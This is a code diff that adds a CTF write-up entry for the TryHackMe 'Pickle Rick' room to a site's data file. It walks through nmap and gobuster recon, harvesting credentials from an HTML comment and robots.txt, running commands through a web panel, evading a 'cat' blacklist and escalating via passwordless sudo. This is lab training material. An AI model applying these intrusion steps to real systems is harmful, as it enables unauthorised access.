@@ -868,6 +868,211 @@ all five levels.`,
       },
     ],
   },
+  {
+    slug: "pickle-rick",
+    name: "Pickle Rick",
+    platform: "TryHackMe",
+    difficulty: "Easy",
+    os: "Linux",
+    date: "2026-01-29",
+    tags: [
+      "nmap",
+      "gobuster",
+      "source-disclosure",
+      "robots-txt",
+      "command-panel",
+      "sudo-privesc",
+    ],
+    summary:
+      "A TryHackMe Linux box where a username hidden in the page source and a password sitting in robots.txt unlock a web command panel, a blacklisted `cat` is worked around with `less`, and www-data's unrestricted sudo hands over root.",
+    phases: [
+      {
+        title: "Recon",
+        body: `\`\`\`shell
+$ nmap -T4 -p- 10.49.178.137
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+\`\`\`
+
+\`\`\`shell
+$ nmap -T4 -p 22,80 -sV 10.49.178.137
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+\`\`\`
+
+\`\`\`shell
+$ gobuster dir -u http://10.49.178.137 -w /usr/share/wordlists/dirb/common.txt -x html,php,txt
+assets                (Status: 301)
+denied.php            (Status: 302) [--> /login.php]
+index.html            (Status: 200)
+login.php             (Status: 200)
+portal.php            (Status: 302) [--> /login.php]
+robots.txt            (Status: 200)
+\`\`\`
+
+Both \`denied.php\` and \`portal.php\` redirect straight to \`login.php\`
+&mdash; whatever's behind that login gate is where the rest of the box
+lives.`,
+      },
+      {
+        title: "Enumeration",
+        body: `The homepage is a Rick and Morty-themed brief: Rick needs help finding
+three secret ingredients, but has forgotten the password.
+
+![Homepage showing the "Help Morty!" brief about three secret ingredients](/writeups/pickle-rick/enum-homepage-help-morty.png)
+
+Intercepting the same response in Burp turns up a comment the page itself
+doesn't render:
+
+\`\`\`html
+<!--
+Note to self, remember username!
+
+Username: R1ckRul3s
+-->
+\`\`\`
+
+![Burp response tab showing the HTML comment with Username: R1ckRul3s](/writeups/pickle-rick/enum-burp-username-comment.png)
+
+SSH with that username is a dead end &mdash; no password was ever offered,
+and the box only accepts key auth:
+
+\`\`\`shell
+$ ssh R1ckRul3s@10.49.178.137
+R1ckRul3s@10.49.178.137: Permission denied (publickey).
+\`\`\`
+
+![SSH refusing R1ckRul3s with Permission denied (publickey)](/writeups/pickle-rick/enum-ssh-publickey-denied.png)
+
+\`robots.txt\`, normally crawler rules, holds a single line instead:
+
+\`\`\`text
+Wubbalubbadubdub
+\`\`\`
+
+![robots.txt served in the browser, containing only Wubbalubbadubdub](/writeups/pickle-rick/enum-robots-txt.png)
+
+That reads less like a disallow rule and more like the missing password for
+\`login.php\`:
+
+![Portal Login Page with username and password fields](/writeups/pickle-rick/enum-login-portal.png)`,
+      },
+      {
+        title: "Foothold",
+        body: `\`R1ckRul3s\` / \`Wubbalubbadubdub\` gets past \`login.php\` and lands on
+\`portal.php\`'s Command Panel &mdash; a text box that executes commands on
+the box:
+
+![portal.php's Command Panel with an empty command input](/writeups/pickle-rick/foothold-command-panel.png)
+
+\`\`\`shell
+$ ls
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+\`\`\`
+
+![Command Panel output listing files including Sup3rS3cretPickl3Ingred.txt and clue.txt](/writeups/pickle-rick/foothold-ls-webroot.png)
+
+\`cat\` is explicitly blacklisted:
+
+\`\`\`shell
+$ cat Sup3rS3cretPickl3Ingred.txt
+Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
+\`\`\`
+
+![Command Panel showing cat disabled with a Mr. Meeseeks image](/writeups/pickle-rick/foothold-cat-disabled.png)
+
+but the blacklist only covers \`cat\` &mdash; \`less\` reads the same file
+straight through:
+
+\`\`\`shell
+$ less Sup3rS3cretPickl3Ingred.txt
+\`\`\`
+
+That's the first ingredient. \`clue.txt\` points further out into the
+filesystem:
+
+\`\`\`shell
+$ less clue.txt
+Look around the file system for the other ingredient.
+\`\`\`
+
+![Command Panel showing clue.txt's hint to look around the filesystem](/writeups/pickle-rick/foothold-clue-txt.png)
+
+\`\`\`shell
+$ ls ../../../home
+rick
+ubuntu
+\`\`\`
+
+![Command Panel listing /home, showing rick and ubuntu](/writeups/pickle-rick/foothold-ls-home.png)
+
+\`\`\`shell
+$ ls /home/rick
+"second ingredients"
+\`\`\`
+
+![Command Panel listing rick's home directory, showing "second ingredients"](/writeups/pickle-rick/foothold-ls-rick-home.png)
+
+\`\`\`shell
+$ less /home/rick/"second ingredients"
+\`\`\`
+
+Same \`less\`-over-\`cat\` trick reads that file too, handing over the
+second ingredient.`,
+      },
+      {
+        title: "Privilege escalation",
+        body: `With two ingredients down and root still out of reach through the
+Command Panel alone, \`sudo -l\` is worth checking as \`www-data\`:
+
+\`\`\`shell
+$ sudo -l
+Matching Defaults entries for www-data on ip-10-49-178-137:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin
+
+User www-data may run the following commands on ip-10-49-178-137:
+    (ALL) NOPASSWD: ALL
+\`\`\`
+
+![sudo -l showing www-data may run (ALL) NOPASSWD: ALL](/writeups/pickle-rick/privesc-sudo-l.png)
+
+No exploit needed &mdash; that's an unrestricted, passwordless sudo grant.
+Reading \`/root\` directly still fails:
+
+\`\`\`shell
+$ ls /root
+\`\`\`
+
+![Command Panel returning nothing for ls /root](/writeups/pickle-rick/privesc-ls-root-empty.png)
+
+but routing the same command through \`sudo\` works:
+
+\`\`\`shell
+$ sudo ls /root
+3rd.txt
+snap
+\`\`\`
+
+![sudo ls /root listing 3rd.txt and snap](/writeups/pickle-rick/privesc-sudo-ls-root.png)
+
+\`\`\`shell
+$ sudo less /root/3rd.txt
+\`\`\`
+
+That reads the third and final ingredient, closing out the room on nothing
+more than a sudoers misconfiguration.`,
+      },
+    ],
+  },
 ];
 
 export function getMachine(slug: string): Machine | undefined {
